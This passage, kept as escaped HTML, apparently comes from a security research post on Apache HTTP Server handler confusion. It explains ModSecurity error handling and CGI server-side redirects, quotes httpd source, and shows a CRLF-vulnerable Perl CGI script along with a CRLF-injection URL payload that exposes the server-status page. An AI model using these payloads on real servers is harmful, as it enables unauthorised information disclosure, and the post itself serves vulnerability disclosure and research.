&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Date: Mon, 29 Jul 2024 05:32:23 GMT
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Server: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;iso-8859-1

&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE HTML PUBLIC &lt;span class=&quot;s2&quot;&gt;&quot;-//IETF//DTD HTML 2.0//EN&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;html&amp;gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;title&amp;gt;400 Bad Request&amp;lt;/title&amp;gt;
...
&amp;lt;?php phpinfo&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In theory, all configurations based on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; are vulnerable to this type of attack, so apart from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi&lt;/code&gt; paired with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_actions&lt;/code&gt; shown in  Max‚Äôs slides, pure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; coupled with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; is also affected.&lt;/p&gt;

&lt;p&gt;It‚Äôs worth mentioning that this side effect was corrected as a &lt;a href=&quot;https://github.com/apache/httpd/commit/3303dc4f7273e05ea9a80402b33f68cd155c146a&quot;&gt;request parser bug&lt;/a&gt; in Apache HTTP Server version 2.4.44, thus treating this ‚Äúvulnerability‚Äù as fixed until I picked it up again. However, since the root cause is still ModSecurity not handling errors properly, the same behavior can still be successfully reproduced if another code path that triggers &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AP_FILTER_ERROR&lt;/code&gt; is found.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. This issue was reported to ModSecurity through the official security mail on 6/20, and the Project Co-Leader suggested returning to the original &lt;a href=&quot;https://github.com/owasp-modsecurity/ModSecurity/issues/2514&quot;&gt;GitHub Issue&lt;/a&gt; for discussion.&lt;/em&gt;&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-3-1-2-overwrite-handler-to---&quot;&gt;‚úîÔ∏è 3-1-2. Overwrite Handler to ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà&lt;/h5&gt;

&lt;p&gt;Based on the &lt;a href=&quot;https://github.com/owasp-modsecurity/ModSecurity/issues/2514&quot;&gt;double response&lt;/a&gt; behavior and its side effects mentioned earlier, this primitive could lead to other more cool exploitations. However, as this issue has not been fully fixed, further exploitation will be disclosed after the issue is fully resolved.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Ô∏è-primitive-3-2-invoke-arbitrary-handlers&quot;&gt;‚öîÔ∏è Primitive 3-2. Invoke Arbitrary Handlers&lt;/h4&gt;

&lt;p&gt;Let‚Äôs think more carefully about the previous Overwrite Handler primitive, although it‚Äôs caused by ModSecurity not properly handling errors, leading to the request being set with the wrong &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt;, the deeper fundamental root cause should be ‚Äî &lt;strong&gt;when using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt;, Apache HTTP Server actually cannot distinguish its semantics; this field can be set by directive during the request phase or used as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; header in the server response&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Theoretically, if you can control the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; header in the server response, you could invoke arbitrary module handlers through this legacy code snippet. This is the last primitive of Handler Confusion ‚Äî &lt;strong&gt;invoking any internal module handler&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;However, there‚Äôs still one last piece of the puzzle. In Httpd, all modifications to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; from the server response occur after that legacy code. So, even if you can control the value of that field, at that point in the HTTP lifecycle, it‚Äôs too late to do further exploitation‚Ä¶ is that right?&lt;/p&gt;

&lt;p&gt;We turned to &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc3875&quot;&gt;RFC 3875&lt;/a&gt; for a rescue! RFC 3875 is a specification about CGI, and &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2&quot;&gt;Section 6.2.2&lt;/a&gt; defines a Local Redirect Response behavior:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The CGI script can return a URI path and query-string (‚Äòlocal-pathquery‚Äô) for a local resource in a Location header field. This indicates to the server that it should reprocess the request using the path specified.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Simply put, the specification mandates that under certain conditions, CGI must use Server-Side resources to handle redirects. A close examination of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_cgi&lt;/code&gt; implementation of this specification reveals:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/modules/generators/mod_cgi.c#L983&quot;&gt;modules/generators/mod_cgi.c#L983&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_scan_script_header_err_brigade_ex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [1]&lt;/span&gt;
                                                    &lt;span class=&quot;n&quot;&gt;APLOG_MODULE_INDEX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log_script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;script_err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HTTP_NOT_MODIFIED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apr_table_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers_out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Location&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [2]&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/* This redirect needs to be a GET no matter what the original
         * method was.
         */&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method_number&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;M_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;cm&quot;&gt;/* We already read the message body (if any), so don&apos;t allow
         * the redirected request to think it has one.  We can ignore
         * Transfer-Encoding, since we used REQUEST_CHUNKED_ERROR.
         */&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;apr_table_unset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers_in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Content-Length&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;ap_internal_redirect_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                     &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [3]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Initially, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_cgi&lt;/code&gt; executes&lt;sup&gt;[1]&lt;/sup&gt; CGI and scans its output to set the corresponding headers such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Status&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt;. If&lt;sup&gt;[2]&lt;/sup&gt; the returned &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Status&lt;/code&gt; is 200 and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Location&lt;/code&gt; header starts with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;, the response is treated as a Server-Side Redirection and should be processed&lt;sup&gt;[3]&lt;/sup&gt; internally. A closer look at the implementation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_internal_redirect_handler()&lt;/code&gt; shows:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/modules/http/http_request.c#L800&quot;&gt;modules/http/http_request.c#L800&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;AP_DECLARE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_internal_redirect_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request_rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;request_rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;internal_internal_redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [1]&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* ap_die was already called, if an error occured */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ap_set_content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [2]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_process_request_internal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [3]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_invoke_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                   &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [4]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ap_die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Httpd first creates&lt;sup&gt;[1]&lt;/sup&gt; a new request structure and copie&lt;sup&gt;[2]&lt;/sup&gt; the current &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; into it. After processing&lt;sub&gt;[3]&lt;/sub&gt; the lifecycle, it calls&lt;sup&gt;[4]&lt;/sup&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_invoke_handler()&lt;/code&gt; ‚Äî the place including the legacy transformation. So, &lt;strong&gt;in Server-Side Redirects, if you can control the response headers, you can invoke any module handler within Httpd&lt;/strong&gt;. Basically, all CGI implementations in Apache HTTP Server follow this behavior, and here‚Äôs a simple list:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;mod_cgi&lt;/li&gt;
  &lt;li&gt;mod_cgid&lt;/li&gt;
  &lt;li&gt;mod_wsgi&lt;/li&gt;
  &lt;li&gt;mod_uwsgi&lt;/li&gt;
  &lt;li&gt;mod_fastcgi&lt;/li&gt;
  &lt;li&gt;mod_perl&lt;/li&gt;
  &lt;li&gt;mod_asis&lt;/li&gt;
  &lt;li&gt;mod_fcgid&lt;/li&gt;
  &lt;li&gt;mod_proxy_scgi&lt;/li&gt;
  &lt;li&gt;‚Ä¶&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As for how to trigger this server-side redirect in real-world scenarios? Since you need at least control over the response‚Äôs &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; and part of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Location&lt;/code&gt;, here are two scenarios for reference:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;CRLF Injection in the CGI response headers, allowing overwriting of existing HTTP headers by new lines.&lt;/li&gt;
  &lt;li&gt;SSRF that can completely control the response headers, such as a project hosted on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_wsgi&lt;/code&gt; like &lt;a href=&quot;https://django-revproxy.readthedocs.io/en/latest/&quot;&gt;django-revproxy&lt;/a&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The following examples are all based on this insecure CRLF Injection for the purpose of demonstration:&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/perl &lt;/span&gt;
 
&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CGI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CGI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$redir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$redir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;m{^https?://}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Location: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$redir&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content-Type: text/html&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;Ô∏è-3-2-1-arbitrary-handler-to-information-disclosure&quot;&gt;‚úîÔ∏è 3-2-1. Arbitrary Handler to Information Disclosure&lt;/h5&gt;

&lt;p&gt;Starting with invoking an arbitrary handler to disclose information, we use the built-in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server-status&lt;/code&gt; handler in Apache HTTP Server, which is typically only allowed to be accessed locally:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /server-status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;SetHandler&lt;/span&gt; server-status
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; local
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the ability to invoke any handler, it becomes possible to overwrite the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; to access sensitive information that should not be accessible remotely:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:server-status&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

